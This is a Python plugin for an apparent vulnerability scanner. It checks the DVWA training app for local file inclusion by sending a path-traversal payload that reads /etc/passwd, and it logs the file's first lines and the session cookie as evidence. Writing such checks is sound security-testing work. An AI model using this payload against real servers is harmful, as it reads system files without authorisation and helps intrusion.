import urllib.request
import re
from typing import Dict, Any
from plugins.base_plugin import BasePlugin

class DVWALFIPlugin(BasePlugin):
    @property
    def METADATA(self) -> Dict[str, Any]:
        return {
            "id": "DVWA-LFI",
            "name": "DVWA Local File Inclusion",
            "cvss_score": 7.5,
            "service": "http",
            "version": "dvwa"
        }

    def match(self, service_info: Dict[str, Any]) -> bool:
        return service_info.get("service", "").lower() in ["http", "https"]

    def verify(self, target_ip: str, target_port: int, context: Dict[str, Any]) -> Dict[str, Any]:
        try:
            # 1. Payload khai thác cụ thể
            payload = "?page=../../../../../../etc/passwd"
            url = f"http://{target_ip}:{target_port}/vulnerabilities/fi/{payload}"
            req = urllib.request.Request(url)
            
            # 2. Lấy session từ bộ nhớ
            dynamic_cookie = context.get("session_cookie", "")
            if not dynamic_cookie:
                return {"status": "PENDING", "evidence": "Chưa có Session Cookie."}
                
            req.add_header("Cookie", dynamic_cookie) 
            
            # 3. Gửi request và đọc dữ liệu
            response = urllib.request.urlopen(req, timeout=5)
            body = response.read().decode('utf-8')
            
            # 4. Xác minh và trích xuất bằng chứng
            if "root:x:0:0:" in body:
                # Chỉ lấy 5 dòng đầu của /etc/passwd để hiển thị cho gọn
                passwd_snippet = "\n".join(body.split('\n')[:5])
                
                # Ghi lại toàn bộ bằng chứng thép
                evidence_detail = (
                    f"Trích xuất thành công tệp hệ thống.\n"
                    f"      - Payload sử dụng : {payload}\n"
                    f"      - Session Cookie  : {dynamic_cookie}\n"
                    f"      - Dữ liệu thu được (5 dòng đầu):\n{passwd_snippet}"
                )
                return {"status": "CONFIRMED", "evidence": evidence_detail}
            else:
                return {"status": "FALSE_POSITIVE", "evidence": "Không đọc được tệp passwd."}
                
        except Exception as e:
            return {"status": "PENDING", "evidence": f"HTTP Error: {str(e)}"}
